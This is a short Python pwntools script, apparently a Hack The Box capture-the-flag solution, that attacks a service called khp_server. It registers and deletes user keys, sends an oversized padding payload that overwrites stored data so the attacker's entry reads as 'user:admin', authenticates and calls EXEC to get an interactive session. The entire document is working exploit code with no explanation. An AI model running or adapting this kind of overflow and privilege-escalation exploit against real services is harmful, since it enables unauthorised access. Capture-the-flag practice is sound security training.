from pwn import *

elf = ELF("khp_server")
p = remote("127.0.0.1",8080)
context.log_level = "debug"

# setting up database and users
p.sendline(b"REKE user:admin 1")
p.recvuntil(b"Registered:")
p.sendline(b"REKE user:notadmin 1")
p.recvuntil(b"Registered:")
p.sendline(b"RLDB")
p.sendline(b"DEKE 2")
p.recvuntil(b"Key deleted ")

# setting up overwrite
payload = b"REKE "
payload += b"user:admin 1"
payload +=b'A'*0x60
payload += b"A" * (0x60-0xC)
payload += b"user:admin 1\n;."

p.sendline(payload)
p.recvuntil(b"Registered:")
##this works on HtB
p.sendline(b"AUTH 1")
p.recvuntil(b"User: user")
p.sendline(b"EXEC")
p.interactive()
